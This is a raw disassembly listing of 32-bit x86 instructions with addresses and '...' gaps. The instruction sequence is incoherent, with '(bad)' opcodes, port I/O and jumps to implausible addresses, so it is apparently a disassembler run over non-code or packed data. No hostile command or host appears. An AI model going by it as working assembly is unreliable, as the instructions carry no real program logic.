  41cd28:	fstp   QWORD PTR [edx+0xb]
  41cd2b:	and    esp,eax
  41cd2d:	repz add esi,DWORD PTR [eax]
  41cd30:	ds sub al,0x18
  41cd33:	repz adc BYTE PTR [ebx-0x2f],bl
  41cd37:	es call 0xdd6b8d2d
  41cd3d:	in     al,dx
  41cd3e:	out    0x34,al
  41cd40:	loope  0x41cd32
  41cd42:	int    0x2f
  41cd44:	fstp   QWORD PTR [edx-0x31]
  41cd47:	and    ch,BYTE PTR [eax+0x65c7fff1]
  41cd4d:	pop    ebx
  41cd4e:	outs   dx,DWORD PTR ds:[esi]
  41cd4f:	enter  0xe66b,0x70
  41cd53:	mov    eax,ds:0x995ef33d
  41cd58:	dec    ebp
  41cd59:	call   0x42515d
	...
  41cd86:	pop    esp
  41cd87:	out    0x71,eax
  41cd89:	add    BYTE PTR [ebp+0x5b],0x70
  41cd8d:	mov    BYTE PTR [edx-0x16],cl
  41cd90:	inc    DWORD PTR [edi-0x77a0ffe4]
  41cd96:	sbb    al,0x5b
  41cd98:	ss mov ah,0xf1
  41cd9b:	sub    esi,DWORD PTR [edx]
  41cd9d:	sbb    BYTE PTR [edx],bh
  41cd9f:	add    BYTE PTR [ebx+0x48],ch
  41cda2:	sub    bh,dh
  41cda4:	pop    esi
  41cda5:	jmp    0x41b5bbcd
  41cdaa:	sbb    esi,ecx
  41cdac:	fs jmp 0x46afc5ca
  41cdb2:	addr16 in eax,dx
  41cdb4:	inc    DWORD PTR [ebx+0x61]
  41cdb7:	out    0x67,eax
  41cdb9:	inc    esp
  41cdba:	ins    BYTE PTR es:[edi],dx
  41cdbb:	pop    ebx
  41cdbc:	jno    0x41cdd5
  41cdbe:	push   ecx
  41cdbf:	out    dx,al
  41cdc0:	outs   dx,DWORD PTR ds:[esi]
  41cdc1:	and    BYTE PTR [edx-0xb],al
  41cdc4:	bound  ebx,QWORD PTR [edx]
  41cdc6:	dec    ebp
  41cdc7:	clc    
  41cdc8:	pusha  
  41cdc9:	or     BYTE PTR [edx-0x1a],al
  41cdcc:	bound  edx,QWORD PTR ds:0x46aee5d
  41cdd2:	inc    edx
  41cdd3:	jmp    0x41ce41
  41cdd5:	add    ah,BYTE PTR [edi]
  41cdd7:	hlt    
  41cdd8:	ins    BYTE PTR es:[edi],dx
  41cdd9:	(bad)  
  41cdda:	cmp    eax,0x2bd66bf8
  41cddf:	cld    
  41cde0:	jbe    0x41cdb0
  41cde2:	push   ss
  41cde3:	xor    BYTE PTR [eax],al
  41cde5:	sbb    BYTE PTR [ebx+0x31],cl
  41cde8:	das    
  41cde9:	sbb    BYTE PTR [eax],al
	...
  41ce13:	add    BYTE PTR [edx-0xc],al
  41ce16:	jb     0x41ce18
  41ce18:	test   BYTE PTR [eax],ch
  41ce1a:	pop    ebp
  41ce1b:	outs   dx,BYTE PTR ds:[esi]
  41ce1c:	add    BYTE PTR [eax+ebp*2+0x65],bl
  41ce20:	sti    
  41ce21:	sub    ebp,DWORD PTR [ecx+0x65]
  41ce24:	pop    ss
  41ce25:	xor    dh,BYTE PTR [ecx+0x73]
  41ce28:	ret    
  41ce29:	outs   dx,BYTE PTR cs:[esi]
  41ce2b:	add    BYTE PTR [ebp-0x419290ca],ch
  41ce31:	sub    eax,0x2a880061
  41ce36:	pop    ebp
  41ce37:	outs   dx,BYTE PTR ds:[esi]
  41ce38:	mov    al,0x32
  41ce3a:	add    BYTE PTR [edx+eax*8+0x2c],dh
  41ce3e:	je     0x41cea9
  41ce40:	mov    ecx,0x67610038
  41ce45:	sub    al,0x6c
  41ce47:	xlat   BYTE PTR gs:[ebx]
  41ce49:	sub    ah,BYTE PTR [ebp+0x63]
  41ce4c:	outs   dx,DWORD PTR ds:[esi]
  41ce4d:	xor    ch,BYTE PTR [esp+ebp*2-0x7e]
  41ce51:	push   edi
  41ce52:	jo     0x41ceb9
  41ce54:	jbe    0x41ce92
  41ce56:	popa   
  41ce57:	add    BYTE PTR [edx+esi*1],al
  41ce5a:	pop    edi
  41ce5b:	jb     0x41ce5f
  41ce5d:	and    eax,DWORD PTR [eax]
  41ce5f:	xor    DWORD PTR [edi-0xb9e8dc8],esp
  41ce65:	xor    DWORD PTR [eax],eax
  41ce67:	ja     0x41ceb7
  41ce69:	sub    ebp,DWORD PTR [ecx+ebp*2+0x46]
  41ce6d:	sub    al,BYTE PTR [eax]
  41ce6f:	imul   edi,DWORD PTR [ebx],0x2e657630
  41ce75:	xor    BYTE PTR [ecx+0x32],dh
	...
  41cea0:	add    BYTE PTR [eax],al
  41cea2:	xchg   edi,eax
  41cea3:	sub    eax,0x2b486365
  41cea8:	popa   
  41cea9:	add    BYTE PTR [ecx-0x4ec9cc9b],dh
  41ceaf:	gs std 
  41ceb1:	ins    BYTE PTR es:[edi],dx
  41ceb2:	xor    BYTE PTR ds:0x5b896966,0x63
  41ceb9:	popa   
  41ceba:	ds jle 0x41cee5
  41cebd:	jne    0x41ce9e
  41cebf:	mov    al,BYTE PTR [ecx]
  41cec1:	retfw  
  41cec3:	xchg   esp,eax
  41cec4:	sub    dh,BYTE PTR [edi-0x57]
  41cec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cec8:	hlt    
  41cec9:	call   FWORD PTR [esi-0x6697cd5f]
  41cecf:	mov    al,ds:0xd3960028
  41ced4:	sub    DWORD PTR [edi-0x5a],ebx
  41ced7:	rol    DWORD PTR [ecx],cl
  41ced9:	jo     0x41ce7c
  41cedb:	aad    0x31
  41cedd:	add    BYTE PTR [eax+eiz*8-0x34728ed9],bl
  41cee4:	sub    esp,DWORD PTR [ebp+0x3e]
  41cee7:	shr    BYTE PTR ds:0x2dd2665f,cl
  41ceed:	pop    edi
  41ceee:	push   esi
  41ceef:	je     0x41cf21
  41cef1:	ja     0x41cf60
  41cef3:	add    al,0x21
  41cef5:	popa   
  41cef6:	arpl   WORD PTR [ebx+0x4],ax
  41cef9:	imul   ebx,DWORD PTR [edi+0x0],0x38
  41cefd:	push   0x61040563
  41cf02:	pop    edi
  41cf03:	push   es
  41cf04:	and    DWORD PTR [eax+eax*1+0x0],esp
	...
  41cf30:	pop    ds
  41cf31:	je     0x41cf63
  41cf33:	and    bl,BYTE PTR ds:0x7225
  41cf38:	and    ch,BYTE PTR ds:[ebx]
  41cf3b:	bound  ebx,QWORD PTR [ebx]
  41cf3d:	inc    edx
  41cf3e:	cmp    BYTE PTR [eax],al
  41cf40:	and    BYTE PTR [ebp+0x32],cl
  41cf43:	arpl   WORD PTR [eax],cx
  41cf45:	dec    edi
  41cf46:	xor    al,BYTE PTR [eax]
  41cf48:	pop    ds
  41cf49:	inc    ecx
  41cf4a:	sub    BYTE PTR [esi+0x19],ah
  41cf4d:	dec    esp
  41cf4e:	add    al,0x72
  41cf50:	fist   WORD PTR [eax+0x2c]
  41cf53:	arpl   dx,sp
  41cf55:	jae    0x41cf86
  41cf57:	pop    edi
  41cf58:	xlat   BYTE PTR ds:[ebx]
  41cf59:	pop    ebp
  41cf5a:	pop    ds
  41cf5b:	ins    DWORD PTR es:[edi],dx
  41cf5c:	jmp    0xcd66b6bb
  41cf61:	repz shl BYTE PTR [edx],cl
  41cf64:	int3   
  41cf65:	pop    edx
  41cf66:	xlat   BYTE PTR ds:[ebx]
  41cf67:	es jmp 0x3e79a359
  41cf6d:	stc    
  41cf6e:	(bad)  
  41cf6f:	aaa    
  41cf70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf71:	cld    
  41cf72:	int3   
  41cf73:	add    ebx,DWORD PTR [edi-0x5ed73a12]
  41cf79:	clc    
  41cf7a:	out    0x21,al
  41cf7c:	xor    esp,0x5b912692
  41cf82:	call   0x5931:0x8bfa9f2c
  41cf89:	pop    ebx
  41cf8a:	jl     0x41cfb6
  41cf8c:	lahf   
  41cf8d:	repnz mov edi,DWORD PTR [edx]
  41cf90:	ds stc 
  41cf92:	(bad)  
  41cf93:	aaa    
	...
  41cfbc:	add    BYTE PTR [eax],al
  41cfbe:	pop    ebp
  41cfbf:	lock mov eax,DWORD PTR [ebx]
  41cfc2:	push   esi
  41cfc3:	clc    
  41cfc4:	jp     0x41cff5
  41cfc6:	push   ebx
  41cfc7:	sub    al,0xe7
  41cfc9:	es gs hlt 
  41cfcc:	dec    esp
  41cfcd:	daa    
  41cfce:	gs pop ebx
  41cfd0:	dec    ebx
  41cfd1:	and    edx,DWORD PTR [edi-0x12]
  41cfd4:	push   edx
  41cfd5:	and    edi,DWORD PTR [esi]
  41cfd7:	jmp    0x2c32:0xed192f47
  41cfde:	adc    DWORD PTR [ebx+0x4a],ebx
  41cfe1:	sub    eax,0x3347eb15
  41cfe6:	test   DWORD PTR ds:[edi],0xcee2523
  41cfed:	sub    BYTE PTR [esi],bh
  41cfef:	out    0x7,eax
  41cff1:	cmp    ebx,DWORD PTR [edx]
  41cff3:	out    dx,al
  41cff4:	sbb    BYTE PTR [eax+ebx*1],al
  41cff7:	out    dx,al
  41cff8:	clc    
  41cff9:	ss in  eax,0x5a
  41cffc:	adc    DWORD PTR ds:0xb9ffece6,ebp
  41d002:	ins    BYTE PTR es:[edi],dx
  41d003:	daa    
  41d004:	add    bl,bh
  41d006:	adc    al,0xfc
  41d008:	addr16 enter 0xf70f,0xff
  41d00d:	retf   0xf621
  41d010:	ins    DWORD PTR es:[edi],dx
  41d011:	ret    0x254c
  41d014:	xor    ch,cl
  41d016:	or     eax,0x65ca5efa
  41d01b:	clc    
  41d01c:	jo     0x41d007
  41d01e:	pop    esi
  41d01f:	out    dx,al
  41d020:	ins    BYTE PTR es:[edi],dx
  41d021:	lds    eax,FWORD PTR [eax]
	...
  41d04b:	add    BYTE PTR ds:0x6abe6bf5,bh
  41d051:	clc    
  41d052:	jno    0x41d03d
  41d054:	dec    esi
  41d055:	cli    
  41d056:	ins    BYTE PTR es:[edi],dx
  41d057:	mov    cs,WORD PTR [ecx-0x8]
  41d05a:	jno    0x41d045
  41d05c:	pop    edi
  41d05d:	cld    
  41d05e:	ins    DWORD PTR es:[edi],dx
  41d05f:	mov    BYTE PTR [ebx-0x4],dl
  41d062:	call   DWORD PTR [edx+0x7a62f01c]
  41d068:	cmp    eax,0x238d70fc
  41d06d:	cld    
  41d06e:	jo     0x41cff5
  41d070:	sbb    ebx,DWORD PTR [ebx+0x76]
  41d073:	push   eax
  41d074:	and    edi,esp
  41d076:	ins    BYTE PTR es:[edi],dx
  41d077:	pop    ebx
  41d078:	adc    ebx,DWORD PTR [ebx+0x6c]
  41d07b:	inc    esi
  41d07c:	adc    al,0xf7
  41d07e:	ins    BYTE PTR es:[edi],dx
  41d07f:	aas    
  41d080:	cmp    ch,BYTE PTR [edx+esi*1]
  41d083:	cli    
  41d084:	jb     0x41d06c
  41d086:	(bad)  
  41d087:	jmp    0xfa72fb36
  41d08c:	mov    bl,0x2d
  41d08e:	add    BYTE PTR [edx],bh
  41d090:	outs   dx,BYTE PTR ds:[esi]
  41d091:	cld    
  41d092:	jno    0x41d0b1
  41d094:	push   eax
  41d095:	clc    
  41d096:	push   0x6cf85ce9
  41d09b:	sbb    ebx,DWORD PTR [ebp-0x8]
  41d09e:	call   DWORD PTR ds:0x6ded53
  41d0a4:	dec    edx
  41d0a5:	and    eax,0x38466d00
  41d0aa:	arpl   WORD PTR [ecx+0x3a],bp
  41d0ad:	push   edi
  41d0ae:	je     0x41d122
	...
  41d0d8:	add    BYTE PTR [eax],al
  41d0da:	xor    DWORD PTR ds:[ebp+0x74],esp
  41d0de:	pop    esi
  41d0df:	pop    eax
  41d0e0:	imul   ebp,DWORD PTR [esi-0x7d],0x2f
  41d0e4:	outs   dx,BYTE PTR ds:[esi]
  41d0e5:	gs push edi
  41d0e7:	addr16 das 
  41d0e9:	xor    esi,DWORD PTR [esi+0x36]
  41d0ec:	pop    edi
  41d0ed:	add    BYTE PTR [eax+esi*1],al
  41d0f0:	arpl   WORD PTR gs:[ebx+edi*1],cx
  41d0f4:	outs   dx,BYTE PTR ds:[esi]
  41d0f5:	add    ch,bh
  41d0f7:	sub    ch,BYTE PTR [esi+0x69]
  41d0fa:	loopne 0x41d121
  41d0fc:	add    BYTE PTR [ebx-0x51],ah
  41d0ff:	and    eax,0x28277365
  41d104:	pop    ebp
  41d105:	jae    0x41d0ab
  41d107:	sub    BYTE PTR [eax],dh
  41d109:	jb     0x41d0c6
  41d10b:	push   edi
  41d10c:	pop    ebp
  41d10d:	jne    0x41d183
  41d10f:	sub    al,0x65
  41d111:	outs   dx,BYTE PTR ds:[esi]
  41d112:	out    0x24,eax
  41d114:	jo     0x41d177
  41d116:	gs sub eax,0x3bb60075
  41d11c:	imul   ebp,DWORD PTR [ecx+0x71],0x75656957
  41d123:	xor    esp,DWORD PTR [ebp+0x6e]
  41d126:	xlat   BYTE PTR ds:[ebx]
  41d127:	cmp    BYTE PTR [ebx+0x6f],ch
  41d12a:	js     0x41d15f
  41d12c:	popa   
  41d12d:	add    BYTE PTR [ecx],cl
  41d12f:	and    eax,0x3b016565
  41d134:	outs   dx,DWORD PTR ds:[esi]
  41d135:	add    bh,bh
  41d137:	das    
  41d138:	jo     0x41d19f
  41d13a:	xchg   edi,eax
  41d13b:	and    al,0x68
  41d13d:	popa   
	...
  41d166:	add    BYTE PTR [eax],al
  41d168:	xor    esi,DWORD PTR [eax]
  41d16a:	imul   eax,DWORD PTR [eax],0x746e2e41
  41d170:	ds dec edi
  41d172:	sub    ah,BYTE PTR [ecx+edx*1+0x72]
  41d176:	and    eax,0x2b48e96d
  41d17b:	outs   dx,BYTE PTR ds:[esi]
  41d17c:	fnstenv [ecx+0x29]
  41d17f:	pop    edi
  41d180:	in     al,dx
  41d181:	push   ebp
  41d182:	pop    ds
  41d183:	ja     0x41d1c3
  41d185:	popa   
  41d186:	sub    BYTE PTR [ebp-0x1b],ch
  41d189:	mov    ?,WORD PTR [eax+eax*1]
  41d18c:	or     DWORD PTR [ebp-0xf],eax
  41d18f:	xor    al,0x3e
  41d191:	cwde   
  41d192:	sub    dh,BYTE PTR [ecx-0x25]
  41d195:	sub    DWORD PTR [ecx],0x2617aa00
  41d19b:	imul   esi,DWORD PTR [edi-0x5e98e2bc],0x925f2d1b
  41d1a5:	inc    esp
  41d1a6:	and    al,0x0
  41d1a8:	xchg   edx,eax
  41d1a9:	in     al,dx
  41d1aa:	das    
  41d1ab:	outs   dx,BYTE PTR ds:[esi]
  41d1ac:	call   0x2bf4:0x8d0032df
  41d1b3:	jb     0x41d14c
  41d1b5:	lock add BYTE PTR [edx+0x5f],ah
  41d1b9:	repnz sbb al,0x67
  41d1bc:	push   0x44
  41d1be:	and    BYTE PTR [esi+0x72],ch
  41d1c1:	out    0x32,eax
  41d1c3:	add    BYTE PTR [edi-0x26],bl
  41d1c6:	sub    eax,0x39b26968
	...
  41d1f3:	add    BYTE PTR [eax],al
  41d1f5:	add    BYTE PTR [ebp-0x57],bl
  41d1f8:	ss jbe 0x41d25e
  41d1fb:	mov    eax,0x9c3e6330
  41d200:	daa    
  41d201:	popa   
  41d202:	and    eax,0x2e0039a7
  41d207:	test   eax,0x442c632f
  41d20c:	and    esp,DWORD PTR [ebx+0x10]
  41d20f:	sahf   
  41d210:	and    DWORD PTR [ebx+0x27],ebp
  41d213:	pop    ebx
  41d214:	adc    eax,0xec71904
  41d219:	xor    bl,BYTE PTR ds:0x212f06d4
  41d21f:	pop    ebx
  41d220:	fdiv   DWORD PTR [edx]
  41d222:	sub    al,0xd2
  41d224:	mov    edx,0x10d13e1e
  41d229:	xor    al,0xdd
  41d22b:	int3   
  41d22c:	out    0x20,eax
  41d22e:	(bad)  
  41d230:	add    al,0x35
  41d232:	loope  0x41d201
  41d234:	out    0x2c,eax
  41d236:	loopne 0x41d1fb
  41d238:	(bad)  
  41d239:	sub    edx,edx
  41d23b:	pop    edx
  41d23c:	fdiv   DWORD PTR [eax]
  41d23e:	(bad)  
  41d240:	sar    DWORD PTR [edx],cl
  41d242:	imul   ebx,DWORD PTR [ebx-0x36],0xb3bc9d35
  41d249:	sub    dh,BYTE PTR [eax-0x6cde1840]
  41d24f:	retf   0x22c9
  41d252:	mov    WORD PTR [ebx-0x78],ds
  41d255:	pop    ds
  41d256:	cdq    
  41d257:	mov    edi,0x3488
	...
  41d284:	ds int 0x86
  41d287:	das    
  41d288:	cdq    
  41d289:	enter  0x380,0x6f
  41d28d:	(bad)  
  41d28e:	mov    BYTE PTR [edx],bh
  41d290:	pop    ebp
  41d291:	int    0xe7
  41d293:	xor    BYTE PTR [ecx-0x32],ah
  41d296:	mov    ebp,DWORD PTR [eax]
  41d298:	push   ebp
  41d299:	pop    ebx
  41d29a:	ja     0x41d2d1
  41d29c:	jns    0x41d262
  41d29e:	pop    edx
  41d29f:	pop    ds
  41d2a0:	ds aad 0x5f
  41d2a3:	and    eax,0x2745bd50
  41d2a8:	ds into 
  41d2aa:	dec    eax
  41d2ab:	daa    
  41d2ac:	sub    eax,0x250453c0
  41d2b1:	les    edx,FWORD PTR [edx+0x1f]
  41d2b4:	ds mov edi,0xc7564800
  41d2ba:	pop    edi
  41d2bb:	cmp    al,BYTE PTR [edx-0x40]
  41d2be:	jb     0x41d2cc
  41d2c0:	xor    ecx,ecx
  41d2c2:	add    BYTE PTR ds:0x1d74cc29,dl
  41d2c8:	and    esp,ecx
  41d2ca:	je     0x41d2b5
  41d2cc:	and    BYTE PTR [edx-0x3dd7f38a],bh
  41d2d2:	popa   
  41d2d3:	adc    al,BYTE PTR [edx-0x38]
  41d2d6:	outs   dx,BYTE PTR ds:[esi]
  41d2d7:	or     al,0x16
  41d2d9:	enter  0x476,0x42
  41d2dd:	mov    edi,0xbf24df5f
  41d2e2:	add    ah,cl
  41d2e4:	add    al,0xc7
  41d2e6:	ins    DWORD PTR es:[edi],dx
  41d2e7:	fild   WORD PTR [eax]
	...
  41d311:	add    BYTE PTR [eax],ah
  41d313:	pop    ebx
  41d314:	popa   
  41d315:	shr    DWORD PTR [eax-0x33],0x61
  41d319:	sar    DWORD PTR ds:0x48d072c1,1
  41d31f:	leave  
  41d320:	fs jmp 0xe9a69984
  41d326:	cmp    DWORD PTR [ecx+esi*2+0x77c9649d],edi
  41d32d:	jmp    0x8cb09989
  41d332:	cmp    eax,0x338a67c4
  41d337:	(bad)  
  41d338:	jno    0x41d2d0
  41d33a:	pop    ds
  41d33b:	iret   
  41d33c:	add    BYTE PTR [ebx-0x44cd750d],bh
  41d342:	jmp    0x41d39c
  41d344:	pop    edi
  41d345:	je     0x41d36a
  41d347:	mov    ebp,0x5b0d4c6c
  41d34c:	das    
  41d34d:	sbb    bl,dl
  41d34f:	mov    DWORD PTR [edi],ebp
  41d351:	sbb    bl,cl
  41d353:	mov    DWORD PTR [eax],eax
  41d355:	dec    edx
  41d356:	popa   
  41d357:	mov    edx,0x8004005f
  41d35c:	ins    BYTE PTR es:[edi],dx
  41d35d:	popa   
  41d35e:	xchg   edi,eax
  41d35f:	sub    BYTE PTR [ebx+0x72],0xf3
  41d363:	jge    0x41d3d3
  41d365:	xor    dl,BYTE PTR [esp+ebx*2-0x76d7939b]
  41d36c:	popa   
  41d36d:	cmp    BYTE PTR [bp+di+0x0],bh
  41d371:	data16 cmp BYTE PTR [eax+0x6274],al
	...
  41d3a0:	inc    esi
  41d3a1:	sub    DWORD PTR [ecx+esi*1+0x67],0xffffff80
  41d3a6:	imul   esi,DWORD PTR [esi+0x4e],0xffffff81
  41d3aa:	arpl   WORD PTR [eax],ax
  41d3ac:	cmp    DWORD PTR [esi+0x74],edi
  41d3af:	push   0x65008146
  41d3b4:	push   0xffffff83
  41d3b6:	pop    ebp
  41d3b7:	outs   dx,BYTE PTR ds:[esi]
  41d3b8:	jb     0x41d435
  41d3ba:	ins    BYTE PTR es:[edi],dx
  41d3bb:	add    BYTE PTR [ebp+edi*2+0x6b],ah
  41d3bf:	outs   dx,DWORD PTR ds:[esi]
  41d3c0:	add    eax,0xf2660097
  41d3c5:	jl     0x41d42e
  41d3c7:	outs   dx,DWORD PTR ds:[esi]
  41d3c8:	add    DWORD PTR [esi+0x0],esi
  41d3cb:	jae    0x41d3c3
  41d3cd:	sub    BYTE PTR [ecx+0x79],0x27
  41d3d1:	sbb    DWORD PTR [ebp+0x78],0xffffffb0
  41d3d5:	jp     0x41d443
  41d3d7:	ins    BYTE PTR es:[edi],dx
  41d3d8:	pop    ss
  41d3d9:	sbb    BYTE PTR [ebp+0x73],0xb8
  41d3dd:	jge    0x41d3df
  41d3df:	push   0x78
  41d3e1:	test   BYTE PTR [esi+0x0],ch
  41d3e4:	mov    dh,0x8e
  41d3e6:	xor    dh,BYTE PTR [edi-0x5c]
  41d3e9:	jp     0x41d41f
  41d3eb:	jb     0x41d3c4
  41d3ed:	jns    0x41d44c
  41d3ef:	bound  ecx,QWORD PTR [esi+0x5c]
  41d3f2:	jb     0x41d459
  41d3f4:	or     DWORD PTR [esi+0x2f],0x33
  41d3f8:	xlat   BYTE PTR ds:[ebx]
  41d3f9:	jns    0x41d467
  41d3fb:	popa   
  41d3fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3fe:	sub    BYTE PTR [edi+0x3e],bl
  41d401:	mov    dl,0x32
  41d403:	add    BYTE PTR [bx+si],al
	...
  41d42e:	and    BYTE PTR [ebp-0x6ed0ffe1],ah
  41d434:	pop    ds
  41d435:	jb     0x41d461
  41d437:	inc    edx
  41d438:	and    ch,BYTE PTR [eax+0x23]
  41d43b:	xchg   esi,eax
  41d43c:	xor    DWORD PTR [ebx+0x1f],esp
  41d43f:	inc    edx
  41d440:	lock xor dl,BYTE PTR [ebx+0x2f]
  41d444:	lock call FWORD PTR [esi]
  41d447:	pusha  
  41d448:	sbb    eax,0x132ea63
  41d44d:	push   0x611d53df
  41d452:	fst    DWORD PTR [ebx+0x20]
  41d455:	add    dl,bl
  41d457:	data16 cmp al,0x74
  41d45a:	jecxz  0x41d4af
  41d45c:	add    DWORD PTR [ecx-0x21],esi
  41d45f:	aaa    
  41d460:	and    BYTE PTR [esi+edi*1+0x73],ah
  41d464:	repz xor DWORD PTR [esi*2+0x23a1fff1],ecx
  41d46c:	and    eax,0x2744a16c
  41d471:	pop    edi
  41d472:	lods   eax,DWORD PTR ds:[esi]
  41d473:	adc    al,0x20
  41d475:	jb     0x41d4b5
  41d477:	sub    BYTE PTR [esi+ebp*2],ah
  41d47a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d47b:	pop    ds
  41d47c:	and    eax,0x2a449b6c
  41d481:	addr16 xchg edx,eax
  41d483:	lock pop ds
  41d485:	outs   dx,BYTE PTR ds:[esi]
  41d486:	ds loope 0x41d4ac
  41d489:	jno    0x41d4f8
  41d48b:	fistp  DWORD PTR [edi]
  41d48d:	add    BYTE PTR [ebp-0x28],ch
  41d490:	and    BYTE PTR [eax+eax*1+0x0],ch
	...
  41d4bc:	pop    edx
  41d4bd:	jecxz  0x41d4bf
  41d4bf:	jo     0x41d52d
  41d4c1:	jecxz  0x41d4fe
  41d4c3:	arpl   WORD PTR [esp+eax*2+0x29],cx
  41d4c7:	ins    DWORD PTR es:[edi],dx
  41d4c8:	dec    edx
  41d4c9:	pop    ebx
  41d4ca:	dec    ebx
  41d4cb:	and    eax,0x2b565b63
  41d4d0:	push   eax
  41d4d1:	mov    edi,0x5b2f2d46
  41d4d6:	cmp    al,0x2f
  41d4d8:	das    
  41d4d9:	iret   
  41d4da:	dec    ebx
  41d4db:	sub    ebx,DWORD PTR ds:0x2a23465b
  41d4e1:	sar    BYTE PTR [edx],0x4
  41d4e4:	sbb    al,0xc4
  41d4e6:	cmp    ebp,DWORD PTR [eax]
  41d4e8:	sbb    edi,DWORD PTR [ebx+ebx*1+0x65b0f1f]
  41d4ef:	sub    al,0x1c
  41d4f1:	mov    edi,0xbe3e261b
  41d4f6:	add    eax,0x14c1e42c
  41d4fb:	add    al,0x19
  41d4fd:	mov    DWORD PTR [edx-0x4172d311],edi
  41d503:	sti    
  41d504:	adc    BYTE PTR [ebx-0x3122fc19],cl
  41d50a:	loop   0x41d53d
  41d50c:	rol    cl,1
  41d50e:	into   
  41d50f:	xor    eax,edx
  41d511:	int    0xdc
  41d513:	add    esp,DWORD PTR [esi+0x7433d3cf]
  41d519:	xchg   BYTE PTR [esi],dl
  41d51b:	xor    DWORD PTR [ecx+0x280cc8],ecx
	...
  41d549:	add    BYTE PTR [ecx-0x55d54631],al
  41d54f:	mov    dh,0x2a
  41d552:	popf   
  41d553:	test   DWORD PTR [edx-0x206e6adc],ecx
  41d559:	repz dec ecx
  41d55b:	mov    eax,esi
  41d55d:	xor    ebp,DWORD PTR [ebx-0x3b]
  41d560:	nop
  41d561:	in     al,0x5a
  41d563:	mov    esp,0xcb181e7b
  41d568:	(bad)  
  41d569:	xor    edi,DWORD PTR [esi]
  41d56b:	ret    
  41d56c:	add    BYTE PTR [ebp+0x29],bh
  41d56f:	retf   
  41d570:	cmp    bh,BYTE PTR [esi+0x4a6dc1da]
  41d576:	sub    DWORD PTR [esi-0x7ae0af92],esi
  41d57c:	pop    bx
  41d57e:	mov    ah,0x8d
  41d580:	xor    BYTE PTR [ecx],dl
  41d582:	stos   BYTE PTR es:[edi],al
  41d583:	xchg   BYTE PTR [eax+0x56],dh
  41d586:	pusha  
  41d587:	into   
  41d588:	sub    eax,0x63cf5d46
  41d58d:	pop    es
  41d58e:	push   edx
  41d58f:	ret    
  41d590:	jo     0x41d57b
  41d592:	cmp    eax,0x521d74c3
  41d597:	xchg   ecx,eax
  41d598:	sub    eax,0x6cb653ce
  41d59d:	sbb    esp,DWORD PTR [ebx]
  41d59f:	iret   
  41d5a0:	jb     0x41d5aa
  41d5a2:	push   ds
  41d5a3:	mov    edx,0x8822fb2e
  41d5a8:	xor    eax,0x2ecff414
  41d5ad:	or     al,0x0
	...
  41d5d7:	add    BYTE PTR [edx],bl
  41d5d9:	mov    edx,0xcf0e0100
  41d5de:	jo     0x41d603
  41d5e0:	arpl   WORD PTR [esi-0x7aed298b],ax
  41d5e6:	outs   dx,BYTE PTR ds:[esi]
  41d5e7:	fsubr  QWORD PTR [esi-0x46]
  41d5ea:	addr16 mov esp,0xc867bf50
  41d5f0:	and    edi,DWORD PTR [ebp+ebp*2+0x54bb1acc]
  41d5f7:	stos   DWORD PTR es:[edi],eax
  41d5f8:	ins    DWORD PTR es:[edi],dx
  41d5f9:	mov    ecx,0xb855c42e
  41d5fe:	add    BYTE PTR [ecx-0x1c8f30a7],dl
  41d604:	sbb    cl,BYTE PTR [eax-0x36e3628f]
  41d60a:	je     0x41d594
  41d60c:	push   ebx
  41d60d:	mov    ebp,0x81d30067
  41d612:	pop    ebp
  41d613:	je     0x41d5cf
  41d615:	jge    0x41d674
  41d617:	jb     0x41d5d5
  41d619:	jne    0x41d68f
  41d61b:	imul   edx,DWORD PTR [ecx+0x77],0x7a70632e
  41d622:	sub    edx,DWORD PTR [edx+0x16]
  41d625:	mov    ?,WORD PTR [ecx]
  41d627:	or     al,BYTE PTR cs:[edi-0x5858ff9f]
  41d62e:	push   ecx
  41d62f:	dec    ecx
  41d630:	inc    edi
  41d631:	mov    al,0x44
  41d633:	inc    esi
  41d634:	outs   dx,BYTE PTR ds:[esi]
  41d635:	fwait
  41d636:	inc    ecx
  41d637:	xor    BYTE PTR [esi],ch
  41d639:	mov    dl,0x45
  41d63b:	push   eax
	...
  41d664:	add    BYTE PTR [eax],al
  41d666:	pop    esp
  41d667:	mov    ds:0xa2534946,eax
  41d66c:	xor    BYTE PTR [ecx+0x4a],bl
  41d66f:	xchg   esi,eax
  41d670:	aas    
  41d671:	push   edx
  41d672:	cs scas eax,DWORD PTR es:[edi]
  41d674:	push   esp
  41d675:	inc    ebp
  41d676:	sbb    ecx,DWORD PTR [edi+0x56]
  41d679:	push   ebp
  41d67a:	cs dec esi
  41d67c:	sub    esi,DWORD PTR [eax]
  41d67e:	push   edi
  41d67f:	pop    eax
  41d680:	add    BYTE PTR [eax],al
  41d682:	addr16 pop esi
  41d684:	add    BYTE PTR [ebp+0x30],cl
  41d687:	mov    ds:0x58560151,eax
  41d68c:	add    BYTE PTR [eax],al
  41d68e:	push   edi
  41d68f:	pop    eax
  41d690:	add    BYTE PTR [eax],al
  41d692:	daa    
  41d693:	lods   eax,DWORD PTR ds:[esi]
  41d694:	dec    ebx
  41d695:	inc    esi
  41d696:	jmp    0x41d648
  41d698:	cmp    eax,0x49a3da52
  41d69d:	imul   esi,esp,0x736b8d
  41d6a3:	xor    BYTE PTR [esp+ebx*2-0x58],0x76
  41d6a8:	outs   dx,BYTE PTR ds:[esi]
  41d6a9:	fs mov al,0x90
  41d6ac:	outs   dx,DWORD PTR ds:[esi]
  41d6ad:	pop    esp
  41d6ae:	aam    0x92
  41d6b0:	jb     0x41d724
  41d6b2:	ds out 0x1e,eax
  41d6b5:	je     0x41d63f
  41d6b7:	fbstp  TBYTE PTR [edx]
  41d6b9:	jno    0x41d712
  41d6bb:	in     eax,dx
  41d6bc:	push   ds
  41d6bd:	pop    esp
  41d6be:	mov    esp,esp
  41d6c0:	sbb    ebp,DWORD PTR [esi+0x4d]
  41d6c3:	(bad)  
  41d6c4:	and    al,0x6c
  41d6c6:	bound  eax,QWORD PTR [edx+0x58]
  41d6c9:	outs   dx,BYTE PTR ds:[esi]
	...
  41d6f2:	add    BYTE PTR [eax],al
  41d6f4:	push   edi
  41d6f5:	lods   al,BYTE PTR ds:[esi]
  41d6f6:	xor    eax,0x20a65f74
  41d6fb:	push   ecx
  41d6fc:	xor    dh,BYTE PTR [eax+0x42196e1b]
  41d702:	inc    ebp
  41d703:	addr16 sub eax,0x275f2092
  41d709:	test   BYTE PTR [ebx],ah
